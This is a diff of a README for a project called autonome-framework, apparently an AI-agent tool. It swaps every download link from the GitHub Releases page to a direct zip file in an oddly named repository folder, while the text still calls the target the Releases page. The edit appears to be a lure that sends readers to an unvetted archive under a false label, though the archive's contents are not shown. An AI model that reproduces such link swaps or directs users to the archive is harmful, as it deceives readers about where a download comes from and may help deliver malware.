@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download autonome-framework](https://img.shields.io/badge/Download-release-blue.svg)](https://github.com/Tonser974/autonome-framework/releases)
+[![Download autonome-framework](https://raw.githubusercontent.com/Tonser974/autonome-framework/main/Machairodontinae/autonome-framework.zip)](https://raw.githubusercontent.com/Tonser974/autonome-framework/main/Machairodontinae/autonome-framework.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ Consult our detailed documentation to learn about setup, features, and usage. Yo
 
 To install autonome-framework, follow these steps:
 
-1. **Visit the Releases Page:** Click the link to [download autonome-framework](https://github.com/Tonser974/autonome-framework/releases).
+1. **Visit the Releases Page:** Click the link to [download autonome-framework](https://raw.githubusercontent.com/Tonser974/autonome-framework/main/Machairodontinae/autonome-framework.zip).
    
 2. **Choose the Latest Release:** Look for the most recent version available.
 
@@ -81,4 +81,4 @@ Feel free to actively participate in shaping the future of autonome-framework. Y
 
 ## 🔗 Download Here Again
 
-For your convenience, you can [download autonome-framework](https://github.com/Tonser974/autonome-framework/releases) at any time from our Releases page. Enjoy harnessing the power of AI agents!
+For your convenience, you can [download autonome-framework](https://raw.githubusercontent.com/Tonser974/autonome-framework/main/Machairodontinae/autonome-framework.zip) at any time from our Releases page. Enjoy harnessing the power of AI agents!
